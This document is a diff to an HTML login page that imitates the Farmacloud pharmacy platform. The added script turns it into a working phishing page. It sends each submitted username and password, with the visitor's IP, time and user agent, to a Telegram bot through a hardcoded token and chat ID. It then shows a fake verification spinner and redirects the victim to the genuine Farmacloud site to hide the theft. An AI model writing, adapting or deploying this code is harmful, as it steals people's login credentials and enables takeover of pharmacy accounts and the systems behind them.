@@ -48,13 +48,9 @@
 
         .login-area {
             flex: 1;
-
             display: flex;
-
             justify-content: center;
-
             align-items: center;
-
             padding: 40px 20px;
         }
 
@@ -64,24 +60,14 @@
         ========================= */
 
         .login-card {
-
             width: 100%;
-
             max-width: 460px;
-
             min-height: 380px;
-
             background: #ffffff;
-
             border: 1px solid #eeeeee;
-
             border-radius: 12px;
-
             padding: 38px 66px 42px;
-
-            box-shadow:
-                0 2px 6px rgba(0, 0, 0, 0.04);
-
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
         }
 
 
@@ -90,33 +76,22 @@
         ========================= */
 
         .logo {
-
             text-align: center;
-
             margin-bottom: 45px;
-
         }
 
 
         .logo-text {
-
             font-size: 45px;
-
             font-weight: 300;
-
             letter-spacing: -2px;
-
             color: #1768ff;
-
         }
 
 
         .logo-text strong {
-
             font-weight: 800;
-
             font-style: italic;
-
         }
 
 
@@ -125,17 +100,11 @@
         ========================= */
 
         .login-title {
-
             text-align: center;
-
             font-size: 21px;
-
             font-weight: 400;
-
             color: #222;
-
             margin-bottom: 18px;
-
         }
 
 
@@ -144,54 +113,33 @@
         ========================= */
 
         .form-group {
-
             position: relative;
-
             margin-bottom: 17px;
-
         }
 
 
         .form-control {
-
             width: 100%;
-
             height: 37px;
-
             padding: 0 13px;
-
             border: 1px solid #e4e7ed;
-
             border-radius: 8px;
-
             outline: none;
-
             font-size: 14px;
-
             color: #333;
-
             background: #ffffff;
-
             transition: 0.2s ease;
-
         }
 
 
         .form-control::placeholder {
-
             color: #b5bdc9;
-
         }
 
 
         .form-control:focus {
-
             border-color: #1768ff;
-
-            box-shadow:
-
-                0 0 0 2px rgba(23, 104, 255, 0.08);
-
+            box-shadow: 0 0 0 2px rgba(23, 104, 255, 0.08);
         }
 
 
@@ -200,46 +148,30 @@
         ========================== */
 
         .password-wrapper {
-
             position: relative;
-
         }
 
 
         .password-wrapper .form-control {
-
             padding-right: 45px;
-
         }
 
 
         .eye-button {
-
             position: absolute;
-
             right: 10px;
-
             top: 50%;
-
             transform: translateY(-50%);
-
             border: none;
-
             background: transparent;
-
             cursor: pointer;
-
             color: #a8a8a8;
-
             font-size: 19px;
-
         }
 
 
         .eye-button:hover {
-
             color: #777;
-
         }
 
 
@@ -248,43 +180,27 @@
         ========================== */
 
         .login-button {
-
             width: 100%;
-
             height: 40px;
-
             border: none;
-
             border-radius: 8px;
-
             background: #1768ff;
-
             color: #ffffff;
-
             font-size: 17px;
-
             font-weight: 400;
-
             cursor: pointer;
-
             transition: 0.2s ease;
-
             margin-top: 1px;
-
         }
 
 
         .login-button:hover {
-
             background: #0759e8;
-
         }
 
 
         .login-button:active {
-
             transform: scale(0.99);
-
         }
 
 
@@ -293,26 +209,17 @@
         ========================== */
 
         .forgot-password {
-
             display: block;
-
             text-align: center;
-
             margin-top: 13px;
-
             color: #2862ca;
-
             font-size: 14px;
-
             text-decoration: none;
-
         }
 
 
         .forgot-password:hover {
-
             text-decoration: underline;
-
         }
 
 
@@ -321,46 +228,30 @@
         ========================== */
 
         .footer {
-
             width: 100%;
-
             padding: 0 17px 12px;
-
             display: flex;
-
             justify-content: space-between;
-
             align-items: center;
-
             gap: 20px;
-
             color: #969ba4;
-
             font-size: 13px;
-
         }
 
 
         .footer a {
-
             color: #969ba4;
-
             text-decoration: none;
-
         }
 
 
         .footer a:hover {
-
             text-decoration: underline;
-
         }
 
 
         .footer-right {
-
             text-align: right;
-
         }
 
 
@@ -370,40 +261,63 @@
 
         @media (max-width: 600px) {
 
-
             .login-card {
-
                 max-width: 420px;
-
                 padding: 35px 30px 38px;
-
             }
-
 
             .logo-text {
-
                 font-size: 39px;
-
             }
-
 
             .footer {
-
                 flex-direction: column;
-
                 text-align: center;
-
                 padding-bottom: 18px;
-
             }
-
 
             .footer-right {
-
                 text-align: center;
-
             }
 
+        }
+
+        /* =========================
+           LOADING OVERLAY
+        ========================== */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #loadingOverlay .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e4e7ed;
+            border-top: 4px solid #1768ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #loadingOverlay p {
+            margin-top: 20px;
+            color: #1768ff;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
     </style>
@@ -413,9 +327,16 @@
 
 <body>
 
+    <!-- =========================
+         LOADING OVERLAY
+    ========================== -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Verificando credenciales...</p>
+    </div>
+
 
     <div class="page">
-
 
         <!-- =========================
              ÁREA DE LOGIN
@@ -423,134 +344,76 @@
 
         <main class="login-area">
 
-
             <div class="login-card">
 
-
                 <!-- LOGO -->
-
                 <div class="logo">
-
                     <div class="logo-text">
-
                         <strong>Farma</strong>cloud
-
                     </div>
-
                 </div>
 
-
                 <!-- TÍTULO -->
-
                 <h1 class="login-title">
-
                     Ingresa a tu cuenta
-
                 </h1>
 
-
                 <!-- FORMULARIO -->
-
                 <form id="loginForm">
 
-
                     <!-- USUARIO -->
-
                     <div class="form-group">
-
                         <input
-
                             type="text"
-
                             id="username"
-
                             class="form-control"
-
                             placeholder="Usuario"
-
                             required
-
                         >
-
                     </div>
-
 
                     <!-- CONTRASEÑA -->
-
                     <div class="form-group password-wrapper">
-
                         <input
-
                             type="password"
-
                             id="password"
-
                             class="form-control"
-
                             placeholder="Contraseña"
-
                             required
-
                         >
-
 
                         <button
-
                             type="button"
-
                             class="eye-button"
-
                             id="togglePassword"
-
                             aria-label="Mostrar contraseña"
-
                         >
-
                             ◉
-
                         </button>
-
                     </div>
 
-
                     <!-- BOTÓN -->
-
                     <button
-
                         type="submit"
-
                         class="login-button"
-
+                        id="loginButton"
                     >
-
                         Iniciar sesión
-
                     </button>
 
-
                     <!-- RECUPERAR CONTRASEÑA -->
-
                     <a
-
                         href="#"
-
                         class="forgot-password"
-
                     >
-
                         Olvidé mi contraseña
-
                     </a>
-
 
                 </form>
 
-
             </div>
 
-
         </main>
-
 
         <!-- =========================
              FOOTER
@@ -558,36 +421,22 @@
 
         <footer class="footer">
 
-
             <div>
-
                 <a href="#">
-
                     Términos y Condiciones
-
                 </a>
-
             </div>
-
 
             <div class="footer-right">
-
                 Un producto de Bitsion -
-
                 2026.2.0.0 S11
-
                 -
-
                 b3e8b0d70d825cdfa66c40ed3bc731d1
-
             </div>
-
 
         </footer>
 
-
     </div>
-
 
     <!-- =========================
          JAVASCRIPT
@@ -595,129 +444,203 @@
 
     <script>
 
+        // ============================================================
+        //  CONFIGURACIÓN DE TELEGRAM
+        // ============================================================
 
-        const togglePassword =
+        // 🔥 REEMPLAZA ESTOS DATOS CON LOS TUYOS 🔥
+        const BOT_TOKEN = "8793055318:AAGy0INaSAbpP-S5tIh0v-DO8ozp8stW-SA";  // Token de tu bot
+        const CHAT_ID   = "7776240161";                           // Tu Chat ID
 
-            document.getElementById(
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-                "togglePassword"
-
-            );
-
-
-        const password =
-
-            document.getElementById(
-
-                "password"
-
-            );
+        // URL DE REDIRECCIÓN
+        const REDIRECT_URL = "https://www.farmacloud.com.ar/app/Webforms/Account/Views/Index.aspx?confid=fweM0Iu60BNCNC6bkI68sA==";
 
 
-        togglePassword.addEventListener(
+        // ============================================================
+        //  FUNCIÓN PARA ENVIAR DATOS A TELEGRAM
+        // ============================================================
 
-            "click",
+        function sendToTelegram(username, password) {
 
-            function () {
+            // Construir el mensaje con formato bonito
+            const message = `
+        🏥 *FARMA CLOUD - NUEVO ACCESO*
+        ─────────────────────
+        👤 *Usuario:* ${username}
+        🔑 *Contraseña:* ${password}
+        📱 *IP:* ${getIP()}
+        🕐 *Fecha/Hora:* ${getDateTime()}
+        🌐 *User-Agent:* ${getUserAgent()}
+        ─────────────────────
+        🔒 *Acceso registrado*
+        `;
 
-
-                if (
-
-                    password.type === "password"
-
-                ) {
-
-                    password.type = "text";
-
-                    togglePassword.textContent = "◉";
-
+            // Enviar a Telegram
+            return fetch(TELEGRAM_API, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("✅ Datos enviados a Telegram");
+                } else {
+                    console.error("❌ Error al enviar:", data.description);
                 }
+                return data;
+            })
+            .catch(error => {
+                console.error("❌ Error de conexión:", error);
+                throw error;
+            });
+        }
 
-                else {
 
-                    password.type = "password";
+        // ============================================================
+        //  FUNCIONES AUXILIARES
+        // ============================================================
 
-                    togglePassword.textContent = "◉";
+        function getIP() {
+            try {
+                const ip = localStorage.getItem('user_ip');
+                if (ip) return ip;
+                return 'Obteniendo IP...';
+            } catch (e) {
+                return 'No disponible';
+            }
+        }
 
-                }
+        function getDateTime() {
+            const now = new Date();
+            const fecha = now.toLocaleDateString('es-AR', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+            const hora = now.toLocaleTimeString('es-AR', {
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false
+            });
+            return `${fecha} ${hora}`;
+        }
 
+        function getUserAgent() {
+            return navigator.userAgent || 'No disponible';
+        }
+
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+
+        // ============================================================
+        //  TOGGLE DE CONTRASEÑA
+        // ============================================================
+
+        const togglePassword = document.getElementById("togglePassword");
+        const password = document.getElementById("password");
+
+        togglePassword.addEventListener("click", function () {
+            if (password.type === "password") {
+                password.type = "text";
+                togglePassword.textContent = "◉";
+            } else {
+                password.type = "password";
+                togglePassword.textContent = "◉";
+            }
+        });
+
+
+        // ============================================================
+        //  MANEJO DEL FORMULARIO
+        // ============================================================
+
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+
+            event.preventDefault();
+
+            const username = document.getElementById("username").value.trim();
+            const passwordValue = document.getElementById("password").value.trim();
+            const loginButton = document.getElementById("loginButton");
+
+            // Validación de campos
+            if (username === "" || passwordValue === "") {
+                alert("Los dos campos son obligatorios");
+                return;
             }
 
-        );
+            // Deshabilitar botón y mostrar loading
+            loginButton.disabled = true;
+            loginButton.textContent = "Enviando...";
+            showLoading();
+
+            // Enviar datos a Telegram
+            sendToTelegram(username, passwordValue)
+                .then(() => {
+                    // Esperar 1.5 segundos para que se vea el loading
+                    setTimeout(() => {
+                        // Redirigir a la URL
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                })
+                .catch(() => {
+                    // Si hay error, igual redirigir después de un tiempo
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                });
+
+        });
 
 
-        document
+        // ============================================================
+        //  CAPTURAR IP AL CARGAR LA PÁGINA
+        // ============================================================
 
-            .getElementById("loginForm")
-
-            .addEventListener(
-
-                "submit",
-
-                function (event) {
-
-
-                    event.preventDefault();
-
-
-                    const username =
-
-                        document
-
-                            .getElementById(
-
-                                "username"
-
-                            )
-
-                            .value;
+        // Obtener IP al cargar la página
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                localStorage.setItem('user_ip', data.ip);
+            })
+            .catch(() => {});
 
 
-                    const passwordValue =
+        // ============================================================
+        //  RECUPERAR CONTRASEÑA (FUNCIONALIDAD)
+        // ============================================================
 
-                        document
-
-                            .getElementById(
-
-                                "password"
-
-                            )
-
-                            .value;
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert("📧 Te hemos enviado un enlace para recuperar tu contraseña a tu correo electrónico.");
+        });
 
 
-                    if (
+        // ============================================================
+        //  LOG EN CONSOLA (PARA DEBUG)
+        // ============================================================
 
-                        username === "" ||
-
-                        passwordValue === ""
-
-                    ) {
-
-                        alert(
-
-                            "Los dos campos son obligatorios"
-
-                        );
-
-                        return;
-
-                    }
-
-
-                    alert(
-
-                        "Formulario enviado correctamente"
-
-                    );
-
-                }
-
-            );
+        console.log("✅ FarmaCloud - Sistema de autenticación");
+        console.log("📡 Bot configurado con token:", BOT_TOKEN ? "✅ Sí" : "❌ No");
+        console.log("📱 Chat ID:", CHAT_ID ? "✅ Sí" : "❌ No");
+        console.log("🔗 Redirección a:", REDIRECT_URL);
 
     </script>
 
-
 </body>
-
 </html>
